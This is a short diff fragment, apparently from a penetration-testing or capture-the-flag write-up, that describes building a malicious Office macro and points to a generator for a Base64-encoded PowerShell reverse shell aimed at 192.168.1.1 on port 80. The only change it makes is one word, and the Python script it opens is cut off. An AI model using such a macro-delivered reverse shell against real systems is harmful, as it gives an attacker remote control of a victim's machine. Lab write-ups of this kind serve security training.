@@ -10,7 +10,7 @@ Choose VIEW ribbon and selecting Macros option. We type name for the macro and i
 
 https://www.revshells.com/ - Reverse - Powershell #4 -Base64 Encoded - 192.168.1.1 - 80
 
-We have to edit the payload for can work. We change related part of str variable.&#x20;
+We have to edit the payload for can work. We change related part of payload variable.&#x20;
 
 ```
 #!/usr/bin/python
